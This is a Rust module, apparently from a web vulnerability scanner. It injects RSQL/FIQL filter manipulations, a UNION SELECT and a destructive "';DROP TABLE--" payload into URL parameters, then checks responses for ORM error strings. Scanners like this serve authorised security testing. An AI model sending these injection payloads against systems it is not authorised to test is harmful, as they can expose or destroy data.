use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// ORM / RSQL Injection detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: ORM / RSQL Injection", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() { return Ok(()); }

    let client = HttpClient::new()?;
    let _baseline = Analyzer::send_and_analyze(&client, target, "").await?;

    let orm_errors = vec![
        "QuerySyntaxException", "HqlSyntaxException", "hibernate",
        "org.hibernate", "JpaSystemException", "ORMException",
        "Doctrine\\ORM", "Sequelize", "ActiveRecord::StatementInvalid",
        "PrismaClientKnownRequestError",
    ];

    for (param_name, original_val) in &params {
        // RSQL/FIQL filter injection
        let payloads = vec![
            format!("{}==*;1==1", original_val),
            format!("{}=gt=0", original_val),
            format!("{}=in=(1,2,3)", original_val),
            format!("{}';DROP TABLE--", original_val),
            format!("{} UNION SELECT null--", original_val),
        ];

        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, &payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, "").await {
                let body_lower = result.response_body.to_lowercase();
                for err in &orm_errors {
                    if body_lower.contains(&err.to_lowercase()) {
                        println!(
                            "{} CONFIRMED: ORM Injection in param '{}'",
                            "[!]".red().bold(), param_name
                        );
                        println!("    Error: {}", err);
                        return Ok(());
                    }
                }
            }
        }
    }

    Ok(())
}
